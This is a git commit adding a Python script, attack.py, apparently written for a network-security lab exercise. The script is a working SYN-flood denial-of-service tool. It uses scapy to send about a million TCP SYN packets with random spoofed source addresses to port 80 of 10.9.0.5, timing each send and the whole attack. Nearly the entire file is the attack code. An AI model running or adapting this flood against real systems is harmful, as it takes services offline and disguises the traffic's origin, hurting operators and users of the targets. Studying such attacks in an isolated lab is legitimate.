72382cdfb371a68c042c57ff07b54e02372a2ff7
LidorKY <118388214+LidorKY@users.noreply.github.com>
2023-05-01 17:22:53 +0300

    Add files via upload

---
+++ attack.py
@@ -0,0 +1,65 @@
+import random
+
+import scapy
+from scapy.layers.inet import IP, TCP
+from scapy.sendrecv import send
+from scapy.all import *
+from scapy.layers.l2 import Ether
+from time import time
+
+
+def syn_packet(sequence):
+    # ------------IP Layer--------------#
+    ip = IP(src=RandIP(), dst="10.9.0.5")
+    # -----------------------------------#
+
+    # ------------Transport Layer--------------#
+    tcp = TCP(sport=random.randint(1024,65000), dport=80, flags="S", seq=counter)
+    # -----------------------------------------#
+
+    # ------------The Complete Packet--------------#
+    syn_packet = ip / tcp
+    # ---------------------------------------------#
+
+    # add calculation of time
+    start = time()
+    send(syn_packet, verbose=False)
+    end = time()
+    calc = end - start
+
+    return calc
+
+
+
+
+if __name__ == '__main__':
+    print("started")
+    fp = open("syns_results_p.txt", "w")
+    temp = 0
+    temp1 = 0
+    counter = 0
+    start1 = time()
+    for i in range(1, 100):
+        for j in range(1, 10000):
+            counter = counter + 1
+            temp = syn_packet(counter)
+            temp1 = temp1 + temp
+            fp.write("Sequence: " + str(counter) + ". Time: " + str(temp) + ".\n")
+
+
+        print("finished loop number " + str(i))
+
+    end1 = time()
+    the_whole_time_for_the_attack = end1 - start1
+
+    fp.write("the average time for each packet is: " + str(temp1/counter))
+    fp.write("the time for the whole attack is: " + str(the_whole_time_for_the_attack))
+    fp.close()
+
+
+
+
+
+
+
+
